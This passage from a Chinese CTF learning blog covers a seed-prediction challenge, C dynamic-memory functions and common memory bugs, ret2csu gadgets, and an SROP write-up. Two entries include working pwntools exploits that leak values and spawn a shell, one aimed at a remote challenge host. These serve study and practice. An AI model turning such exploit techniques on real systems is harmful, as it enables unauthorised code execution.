<p><strong>ctypes</strong> 是 Python 的一个外部函数库，用于调用 C 语言的动态链接库（DLL）或共享库。它提供了与 C 语言兼容的数据类型，并允许在 Python 中直接调用 C 函数。</p>
<p>通过分析程序可以看出，我们只要满足v7&#x3D;&#x3D;v8就可以获得shell。那么我们来看怎么得到v8的随机数呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">seed = time(<span class="number">0LL</span>);</span><br><span class="line">srand(seed[<span class="number">0</span>]);</span><br><span class="line">v3 = rand();</span><br><span class="line">v4 = rand() ^ v3;</span><br><span class="line">v5 = rand();</span><br><span class="line">srand(v4 ^ v5);</span><br><span class="line">rand();</span><br><span class="line">rand();</span><br><span class="line">rand();</span><br><span class="line">v8 = rand();</span><br></pre></td></tr></table></figure>

<p>可以看出，这里的种子是time(NULL)，得到两个随机数后，又重新设置了种子。也就是说只要我们求出新的种子，再求出第四个随机数就可以得到v8了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">27416</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;username: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;password: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;ls_4nyth1n9_7ruIy_R4nd0m?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">seed = u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(seed)</span><br><span class="line"></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">v4 = libc.rand() ^ v3</span><br><span class="line">v5 = libc.rand()</span><br><span class="line">libc.srand(v4 ^ v5)</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">v7 = libc.rand()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;now.\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(v7))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这边解释一下exp。这里的s和seed[2]是紧挨着的，而read读取的最大长度刚好是0x20，也就是s所有的字节大小。那么当我读入0x20padding时，下面的printf便会输出，直到遇到\x00，也就是说，会读出seed[0]，也就是我们需要的第一个种子，也就可以得到接下来的种子了。</p>
<p>ctypes.CDLL是加载动态链接库，也就是可以用来调用C语言。</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>动态内存分配</title>
    <url>/2025/12/19/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/</url>
    <content><![CDATA[<h1 id="1-malloc"><a href="#1-malloc" class="headerlink" title="1.malloc"></a>1.malloc</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">malloc</span> <span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p>向内存申请一块连续可用的空间，并返回指向这块空间的指针。</p>
<p>如果返回成功，则返回一个指向开辟好空间的指针。</p>
<p>如果开辟失败，则返回一个<code>NULL</code>指针，因此malloc的返回值一定要做检查。</p>
<p>返回值的类型是<code>void*</code>，所以malloc函数并不知道开辟空间的类型，具体使用情况由使用者决定。</p>
<p>如果参数<code>size</code>为0，malloc的行为是标准是未定义的，取决于编译器。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">20</span>);<span class="comment">//由于malloc的返回值是void*，所以这里强制类型转化为我们所需要的。</span></span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc&quot;</span>);<span class="comment">//用于错误处理的库函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//使用空间</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(p + i) = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="2-free"><a href="#2-free" class="headerlink" title="2.free"></a>2.free</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span> <span class="params">(<span class="type">void</span>* ptr)</span>;</span><br></pre></td></tr></table></figure>

<p>专门用来做动态内存的释放和回收。</p>
<p>如果参数<code>ptr</code>指向的空间不是动态开辟的，那free函数的行为是未定义的。</p>
<p>如果<code>ptr</code>是NULL指针，则函数什么事都不做。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p);<span class="comment">//传递的是要释放内存空间的起始地址。释放完p指针后，p为野指针。</span></span><br><span class="line">p = <span class="literal">NULL</span>;<span class="comment">//避免成为野指针。</span></span><br></pre></td></tr></table></figure>



<h1 id="3-calloc"><a href="#3-calloc" class="headerlink" title="3.calloc"></a>3.calloc</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">calloc</span> <span class="params">(<span class="type">size_t</span> num, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p>函数的功能是<code>num</code>个大小为<code>size</code>的元素开辟一块空间，并且把空间的内个字节初始化为0。</p>
<p>与函数<code>malloc</code>的区别在于<code>calloc</code>会在返回地址之前把申请的空间的每个字节初始化为全0。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">calloc</span>(<span class="number">5</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure>



<h1 id="4-realloc"><a href="#4-realloc" class="headerlink" title="4.realloc"></a>4.realloc</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">realloc</span> <span class="params">(<span class="type">void</span>* ptr, <span class="type">size_t</span> size)</span></span><br></pre></td></tr></table></figure>

<p>realloc函数的出现让动态内存管理更加灵活。</p>
<p>为了合理的使用内存，我们对内存的大小做灵活的调整。那<code>realloc</code>函数就可以做到对动态开辟内存大小的调整。</p>
<p><code>ptr</code>是要调整的内存地址。</p>
<p><code>size</code>调整之后新的大小。</p>
<p>返回值为调整之后的内存起始位置。</p>
<p>如果调整失败，返回的是空指针NULL。</p>
<p>这个函数再调整原内存空间大小的基础上，还会将原来内存中的数据移动到新的空间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="built_in">realloc</span>(p,<span class="number">40</span>)；</span><br></pre></td></tr></table></figure>

<p><img src="/images/malloc1.png"></p>
<p>在情况2下：</p>
<p>1.在堆区的内存中找一个新的空间，并且满足新的大小要求</p>
<p>2.会将原来空间的数据拷贝一份到新的空间。</p>
<p>3.释放旧的空间。</p>
<p>4.返回新的内存空间的起始地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">realloc</span>(<span class="literal">NULL</span>,<span class="number">20</span>) = <span class="built_in">malloc</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure>



<h1 id="5-常见的动态内存的错误"><a href="#5-常见的动态内存的错误" class="headerlink" title="5.常见的动态内存的错误"></a>5.常见的动态内存的错误</h1><h2 id="5-1对NULL指针的解引用操作"><a href="#5-1对NULL指针的解引用操作" class="headerlink" title="5.1对NULL指针的解引用操作"></a>5.1对NULL指针的解引用操作</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">    *p = <span class="number">20</span>;<span class="comment">//为对返回值经行判断是否为NULL。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-2对动态开辟空间的越界访问"><a href="#5-2对动态开辟空间的越界访问" class="headerlink" title="5.2对动态开辟空间的越界访问"></a>5.2对动态开辟空间的越界访问</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(p+i) = i;<span class="comment">//当i是10的时候就越界访问。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    p = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-3对非动态开辟的内存使用free释放"><a href="#5-3对非动态开辟的内存使用free释放" class="headerlink" title="5.3对非动态开辟的内存使用free释放"></a>5.3对非动态开辟的内存使用free释放</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;<span class="comment">//局部变量，在栈上。</span></span><br><span class="line">    <span class="type">int</span>* p = &amp;a;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-4使用free释放一块动态开辟内存的一部分"><a href="#5-4使用free释放一块动态开辟内存的一部分" class="headerlink" title="5.4使用free释放一块动态开辟内存的一部分"></a>5.4使用free释放一块动态开辟内存的一部分</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *p = i+<span class="number">1</span>;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);<span class="comment">//此时p指向的位置不是动态开辟空间的起始地址。</span></span><br><span class="line">    p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-5对同一块动态内存多次释放"><a href="#5-5对同一块动态内存多次释放" class="headerlink" title="5.5对同一块动态内存多次释放"></a>5.5对同一块动态内存多次释放</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);<span class="comment">//记得要p = NULL;</span></span><br><span class="line">    <span class="built_in">free</span>(p);<span class="comment">//重复释放</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-6动态开辟内存忘记释放-（内存泄漏）"><a href="#5-6动态开辟内存忘记释放-（内存泄漏）" class="headerlink" title="5.6动态开辟内存忘记释放 （内存泄漏）"></a>5.6动态开辟内存忘记释放 （内存泄漏）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *p = <span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有使用free来释放，当程序运行结束的时候，也会由操作系统回收的！</p>
<p>尽量要做到：</p>
<p>1.谁（函数等）申请的空间谁释放。（malloc和free要成对出现）</p>
<p>2.如果不能释放，要告诉使用的人，记得释放。</p>
]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2csu</title>
    <url>/2025/11/21/ret2csu/</url>
    <content><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>将附件丢进ida</p>
<p><img src="/images/ret2csu-(1).png" alt="ida"></p>
<p>可以看到，程序中不存在任何后门函数。但是附件又给了libc.so.6，所以我们可以通过write函数，将write或者read的地址进行泄露，从而达到ret2libc的做法。</p>
<p>于是我们需要控制write的执行流。可以看出write有三个参数：fd，buf，len。在x86-64架构下，前六个参数依次存在rdi，rsi，rdx，rcx，r8，r9。所以我们只要做到rsi &#x3D; 1；rdi &#x3D; write_got；len&gt;&#x3D;8就可以了。</p>
<p>__libc_csu_init进行初始化时有这么一串汇编指令：</p>
<p><img src="/images/ret2csu-(2).png" alt="ida"></p>
<p>如果我们把上半部分成为gadget2，下半部分gadget1。那么在gadget1中可以看出我们可以轻松控制pop到各个寄存器的值，再结合gadget2，可以看出控制r12间接控制rdi–fd（这里r12d是指取rdi的低四字节的值，因为是控制fd所以不影响）；控制r13间接控制rsi–write_got；控制r14间接控制rdx–len。所以我们需要在vuln中进行栈溢出，控制程序执行到gadget1的位置，然后精心构造各个寄存器的值，进行我们需要的充满特定参数的函数。</p>
<p><img src="/images/ret2csu-(3).png" alt="exp"></p>
<p>可以看到exp中还控制了rbx和rbp的值，这是为什么呢？</p>
<p><img src="/images/ret2csu-(4).png" alt="ida"></p>
<p>后面就是和ret2libc一样的做法了，就不多赘述了。</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2srop</title>
    <url>/2025/12/15/ret2srop/</url>
    <content><![CDATA[<h1 id="ret2srop"><a href="#ret2srop" class="headerlink" title="ret2srop"></a>ret2srop</h1><h4 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h4><p>srop在wiki里归类为高阶rop。</p>
<p>首先需要了解什么是srop。</p>
<p><code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p>
<h2 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h2><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
<p><img src="/images/srop1.png" alt="signal"></p>
<ol>
<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>
<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的。**之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li>
<li>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</li>
</ol>
<p>这里就不过多赘述了，给出链接。</p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki</a></p>
<p><img src="/images/srop2.png" alt="ida"></p>
<p>可以看出，这里系统调用read和write函数。同时0xf是sigreturn的调用号，所以我们可以尝试srop。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(elf.sym.vuln)<span class="comment">#这里不是0x18的原因是，汇编中直接ret，而没有leave，所以直接写入vuln地址就行了</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">rsp = stack -  <span class="number">0x118</span></span><br><span class="line">gadget = <span class="number">0x4004da</span> <span class="comment">#mov rax,0xf</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">sigFrame = SigreturnFrame() </span><br><span class="line">sigFrame.rax =<span class="number">59</span></span><br><span class="line">sigFrame.rdi = rsp</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall_ret</span><br><span class="line">pl2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(gadget) + p64(syscall_ret) + <span class="built_in">bytes</span>(sigFrame)</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>解释一下exp。</p>
<p>这里因为调用了write函数，而且写出的是我们输入的位置的地址。进入gdb动调看下write会写出什么。</p>
<p><img src="/images/srop3.png" alt="gdb"></p>
<p>可以看出，在0x7fffffffde60的位置，放着栈上的地址。（0x7fffffffde50上存放的地址会被我们填充的数据覆盖，所以选择接受de60处的。）由于ASLR机制的存在，所以我们无法得出准确的地址，但是偏移量是不变的。所以此时的偏移就是distance 0x00007fffffffdf58 0x7fffffffde40 ; offset &#x3D; 0x118。（这里建议换下环境，不然偏移可能不同。由于版本是ubuntu18，所以这里用的是  libc-2.27.so   2.27-3ubuntu1_amd64）</p>
<p>所以我们写入的地址就是我们接收的的地址再减去0x118。后面就是srop的书写格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sigFrame = SigreturnFrame() </span><br><span class="line">sigFrame.rax =<span class="number">59</span> <span class="comment">#设置rax的值为59，是execve的系统调用号</span></span><br><span class="line">sigFrame.rdi = rsp <span class="comment">#这里是将我们写入的栈地址作为一参传入</span></span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span> <span class="comment">#execve(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">sigFrame.rip = syscall_ret <span class="comment">#调用sigFrame</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
</search>
